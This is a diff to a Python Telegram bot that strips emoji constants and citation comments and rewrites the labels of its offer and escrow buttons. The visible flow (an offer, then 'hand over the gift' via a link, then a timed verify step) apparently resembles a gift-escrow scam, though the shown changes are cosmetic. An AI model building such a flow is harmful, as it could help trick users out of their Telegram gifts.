@@ -25,15 +25,10 @@ TARGET_URL = "https://t.me/HeiseySex"
 VERIFY_TIMEOUT_SECONDS = 300  # 5 минут
 
 # ─────────────────────── ПРЕМИУМ-ЭМОДЗИ (ID) ───────────────────────
-# ID взяты из открытого каталога telegram-premium-emojis [citation:1]
 
-EMOJI_GIFT = '<tg-emoji emoji-id="5456140674028019486">🎁</tg-emoji>'  # Подарок
-EMOJI_STAR = '<tg-emoji emoji-id="5874948844935974490">⭐️</tg-emoji>'  # Звезда [citation:1]
-EMOJI_LOCK = '<tg-emoji emoji-id="5807868868886009920">🔒</tg-emoji>'  # Замок
-EMOJI_CONFIRM = '<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji>'  # Галочка [citation:1]
-EMOJI_CANCEL = '<tg-emoji emoji-id="5258226313285607065">❌</tg-emoji>'  # Крестик [citation:1]
-EMOJI_LIGHTNING = '<tg-emoji emoji-id="5843553939672274145">⚡️</tg-emoji>'  # Молния [citation:1]
-EMOJI_LINK = '<tg-emoji emoji-id="5877536313623711363">🔗</tg-emoji>'  # Ссылка
+EMOJI_GIFT = '<tg-emoji emoji-id="5456140674028019486">🎁</tg-emoji>'
+EMOJI_STAR = '<tg-emoji emoji-id="5874948844935974490">⭐️</tg-emoji>'
+EMOJI_LOCK = '<tg-emoji emoji-id="5807868868886009920">🔒</tg-emoji>'
 
 # ─────────────────────── ИНИЦИАЛИЗАЦИЯ ───────────────────────
 
@@ -135,8 +130,8 @@ def build_offer_message(name, url, amount):
 def build_offer_keyboard():
     keyboard = InlineKeyboardMarkup()
     keyboard.row(
-        InlineKeyboardButton("✅ Принять", callback_data="stage_accept"),
-        InlineKeyboardButton("❌ Отклонить", callback_data="stage_decline"),
+        InlineKeyboardButton("<b>Принять</b>", callback_data="stage_accept"),
+        InlineKeyboardButton("<b>Отклонить</b>", callback_data="stage_decline"),
     )
     return keyboard
 
@@ -161,10 +156,10 @@ def build_escrow_message(name, url, amount):
 
 def build_escrow_keyboard():
     keyboard = InlineKeyboardMarkup()
-    keyboard.row(InlineKeyboardButton("🔗 Передать подарок", url=GIFT_URL))
+    keyboard.row(InlineKeyboardButton("<b>Передать подарок</b>", url=GIFT_URL))
     keyboard.row(
-        InlineKeyboardButton("⚡ Подтвердить", callback_data="stage_verify"),
-        InlineKeyboardButton("❌ Отменить", callback_data="stage_decline"),
+        InlineKeyboardButton("<b>Подтвердить</b>", callback_data="stage_verify"),
+        InlineKeyboardButton("<b>Отменить</b>", callback_data="stage_decline"),
     )
     return keyboard
 
